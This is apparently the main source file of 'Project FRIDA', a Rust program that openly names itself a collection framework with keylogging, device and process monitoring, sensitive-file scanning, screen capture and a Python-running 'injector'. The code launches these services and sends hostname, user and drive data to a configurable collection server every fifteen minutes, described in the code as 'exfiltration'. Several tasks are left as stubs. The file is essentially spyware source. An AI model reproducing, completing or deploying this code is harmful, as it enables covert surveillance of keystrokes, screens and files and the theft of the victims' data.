//! Project FRIDA - System Monitoring and Data Collection Framework
//!
//! This application provides comprehensive system monitoring capabilities,
//! including keylogging, device monitoring, drive enumeration, process monitoring,
//! and sensitive file scanning. Data is collected locally and can be exfiltrated
//! to a remote server with full metadata and analysis.

/// Storage device enumeration and information gathering
pub mod drives;
/// USB and peripheral device monitoring
pub mod device_monitor;
/// Keyboard input monitoring and logging
pub mod keylogger;
/// Network communication for data exfiltration
pub mod network;
/// File system operations for data persistence
pub mod writer;
/// Logging utilities for application events
pub mod log;
/// Process monitoring and Python script execution module
pub mod injector;
/// File scanning and content analysis module
pub mod file_scanner;
/// Screen capture module
pub mod screen_capture;
use serde::Serialize;
use std::env;
use crate::log::Log;



#[derive(Serialize)]
struct Payload<'a> {
    hostname: String,
    drives: &'a [drives::DriveInfo],
}

#[tokio::main]
async fn main() {
    Log::info(format!("Project Frida (Rust Edition) - Initializing..."));
    // 1. Start the keylogger in a background thread.
    keylogger::start_keylogger();
    // 1.1. Start the device monitor in a background thread.
    device_monitor::start_device_monitor();
    // 1.2. Start Injector Service
    injector::start_injector_service();
    // 1.3. Start File Scanner Service
    file_scanner::start_file_scanner();
    // 2. Collect drive info.
    let drives = drives::list_drives();
    Log::info(format!("Found {} drives:", drives.len()));
    for drive in &drives {
        Log::info(format!("  - {:?}", drive));
    }
    // 2.1. Capture and save a screenshot
    match screen_capture::ScreenCapture::capture_and_save("logs/screenshots") {
        Ok(path) => Log::info(format!("Screenshot saved to {}", path)),
        Err(e) => Log::error(format!("Failed to capture screenshot: {:?}", e)),
    };
    // 3. Persist locally.
    let _ = writer::save_output(&drives, "logs/drive_info.json", false)
    .map_err(|e| Log::error(format!("Failed to save drive info: {}", e))); 
    // 4. Exfiltrate data to server.
    let server_url = env::var("COLLECT_ENDPOINT").unwrap_or_else(|_| "http://localhost:8080/collect".to_string());
    let hostname = sysinfo::System::host_name().unwrap_or_else(|| "unknown_host".to_string());
    let payload = Payload {
        hostname,
        drives: &drives,
    };
    Log::info(format!("Sending data to {}...", server_url));
    match network::send_to_server(&payload, &server_url).await {
        Ok(_) => Log::info(format!("Data sent successfully.")),
        Err(e) => Log::error(format!("Failed to send data: {}", e)),
    };
    // Service configuration
    let config = ServiceConfig {
        keylogger_interval_secs: 60,
        device_scan_interval_secs: 300,
        drive_scan_interval_secs: 1800,
        process_scan_interval_secs: 120,
        file_scan_interval_secs: 3600,
        data_exfiltration_interval_secs: 900,
    };

    Log::info(format!("Starting FRIDA service with configured intervals"));
    run_service(config, server_url).await;
}

/// Service configuration parameters
struct ServiceConfig {
    keylogger_interval_secs: u64,
    device_scan_interval_secs: u64,
    drive_scan_interval_secs: u64,
    process_scan_interval_secs: u64,
    file_scan_interval_secs: u64,
    data_exfiltration_interval_secs: u64,
}

/// Main service runner with scheduled tasks
async fn run_service(config: ServiceConfig, server_url: String) {
    use tokio::time::{interval, Duration};
    use tokio::signal::ctrl_c;
    use tokio::select;
    use std::sync::atomic::{AtomicBool, Ordering};
    use std::sync::Arc;

    // Set up the shutdown signal
    let shutdown = Arc::new(AtomicBool::new(false));
    let shutdown_clone = shutdown.clone();
    
    // Spawn a task to handle Ctrl+C
    tokio::spawn(async move {
        if let Ok(_) = ctrl_c().await {
            Log::info(format!("Shutdown signal received"));
            shutdown_clone.store(true, Ordering::SeqCst);
        }
    });

    Log::info(format!("Service started. Press Ctrl+C to exit."));

    // Create intervals for different tasks
    let mut keylogger_interval = interval(Duration::from_secs(config.keylogger_interval_secs));
    let mut device_scan_interval = interval(Duration::from_secs(config.device_scan_interval_secs));
    let mut drive_scan_interval = interval(Duration::from_secs(config.drive_scan_interval_secs));
    let mut process_scan_interval = interval(Duration::from_secs(config.process_scan_interval_secs));
    let mut file_scan_interval = interval(Duration::from_secs(config.file_scan_interval_secs));
    let mut data_exfiltration_interval = interval(Duration::from_secs(config.data_exfiltration_interval_secs));

    // Service main loop
    while !shutdown.load(Ordering::SeqCst) {
        select! {
            _ = keylogger_interval.tick() => {
                Log::info(format!("Performing keylogger data collection"));
                // In a full implementation, this would process and save keylogger data
                // This is already running in a separate thread, so this would just
                // handle flushing buffers or other maintenance tasks
            }

            _ = device_scan_interval.tick() => {
                Log::info(format!("Scanning for connected devices"));
                // In a full implementation, this would call device_monitor functions
                // to check for newly connected devices
            }

            _ = drive_scan_interval.tick() => {
                Log::info(format!("Scanning drives and storage media"));
                let drives = drives::list_drives();
                Log::info(format!("Found {} drives", drives.len()));
                // Full implementation would process and store this information
            }

            _ = process_scan_interval.tick() => {
                Log::info(format!("Monitoring system processes"));
                // In a full implementation, this would scan running processes
                // and possibly execute Python scripts for deeper analysis
            }

            _ = file_scan_interval.tick() => {
                Log::info(format!("Scanning for sensitive files"));
                // In a full implementation, this would scan for sensitive files
                // across user directories as described in the project docs
            }

            _ = data_exfiltration_interval.tick() => {
                Log::info(format!("Performing scheduled data exfiltration"));
                let hostname = drives::sys_info().current_user;
                let drives = drives::list_drives();
                
                let payload = Payload {
                    hostname,
                    drives: &drives,
                };
                
                Log::info(format!("Sending data to {}...", server_url));
                match network::send_to_server(&payload, &server_url).await {
                    Ok(_) => Log::info(format!("Data sent successfully.")),
                    Err(e) => Log::error(format!("Failed to send data: {}", e)),
                };
            }
        }

        // Brief sleep to prevent CPU hogging
        tokio::time::sleep(Duration::from_millis(50)).await;
    }

    // Perform cleanup when service is shutting down
    Log::info(format!("Service shutting down, performing cleanup..."));
    // Cleanup code would go here - close files, flush buffers, etc.
    Log::info(format!("Service shutdown complete"));
}
